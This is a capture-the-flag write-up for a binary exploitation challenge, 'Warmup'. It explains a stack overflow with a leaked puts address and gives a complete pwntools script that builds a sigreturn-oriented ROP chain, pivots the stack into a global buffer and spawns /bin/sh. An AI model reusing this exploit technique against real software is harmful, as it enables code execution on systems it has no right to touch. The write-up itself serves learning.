## PWN - Warmup

This challenge was really fun. It might have been easier for some more experienced people but I am fairly new and had a lot of headache near the end.

This challenge started off fairly straight-forward since from first glance into the disassembly code you can see that it would be a stack pivot problem since it only gives you 16 bytes to work with.

``` c
undefined8 main(void)

{
  char local_48 [64];
  
  helper();
  printf("%p\n",puts);
  printf("name>> ");
  fgets(name,0x200,stdin);
  printf("alright>> ");
  fgets(local_48,0x58,stdin);
  puts("okey");
  return 0;
}
```

So first off I thought I would write a ret2libc ROP chain into the "name" variable and then use the `pop rsp ; ret` gadget I found in the binary for a stack pivot.

Now the only problem here is, there is only 512 allocated bytes into the `name` buffer, which will not be enough. But I didn't know that until a few hours later when I realized the reason `system` was breaking was because it was setting the stack pointer way above where it was intended. Below is the assembler code before and at the point it breaks. Here you can see the stack pointer being set a long way further up and the point where the exploit breaks since it is trying to write into an unwriteable area in memory.

```
   0x00007f4b0993f92e <+46>:    sub    rsp,0x388
   0x00007f4b0993f935 <+53>:    mov    rax,QWORD PTR fs:0x28
   0x00007f4b0993f93e <+62>:    mov    QWORD PTR [rsp+0x378],rax
   0x00007f4b0993f946 <+70>:    xor    eax,eax
=> 0x00007f4b0993f948 <+72>:    mov    DWORD PTR [rsp+0x18],0xffffffff
```

### Solution

So if there is not enough space to call `system` then I decided to create an SROP chain, using gadgets from libc. But first I must leak the libc PIE offset. Thankfully the challenge gives you the address of `puts` so the hard work is already done for you.

``` python
puts = io.recvuntil(b"\n")
puts = int (puts, 16)
offset = puts - libc.symbols["puts"]
```

I will also need to gather all the gadgets needed for this.

``` python
pop_rsp = p64 (0x40118e) # push rbp ; mov rbp, rsp ; pop rsp ; ret
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
syscall = rop.find_gadget(["syscall"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
binsh = p64 (next(libc.search(b"/bin/sh")) + offset)
```

Now with this I can create the SROP chain.

``` python
frame = SigreturnFrame()
frame.rax = 59 # execve syscall
frame.rdi = next(libc.search(b"/bin/sh")) + offset
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall + offset

srop = p64(pop_rax + offset) + p64(0xf) + p64(syscall + offset) + bytes(frame)
```

And now all I must do is pivot the stack into `name` with the overflow.

``` python
target_buf_start = p64(0x404060)

overflow = b"A"*64 + target_buf_start + pop_rsp + target_buf_start
```

### Final solution

``` python
from pwn import *

io = process ("./warmup")
file = context.binary = ELF("./warmup")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


# GADGETS

rop = ROP(libc)

puts = io.recvuntil(b"\n")
puts = int(puts, 16)
offset = puts - libc.symbols["puts"]

pop_rsp = p64(0x40118e) # push rbp ; mov rbp, rsp ; pop rsp ; ret
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
syscall = rop.find_gadget(["syscall"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
binsh = p64 (next(libc.search(b"/bin/sh")) + offset)


# SROP

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = next(libc.search(b"/bin/sh")) + offset
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall + offset

srop = p64(pop_rax + offset) + p64(0xf) + p64(syscall + offset) + bytes(frame)


# PIVOT SECTION

target_buf_start = p64(0x404060)

overflow = b"A"*64 + target_buf_start + pop_rsp + target_buf_start

io.sendline(srop)
io.sendline(overflow)

io.interactive()
```
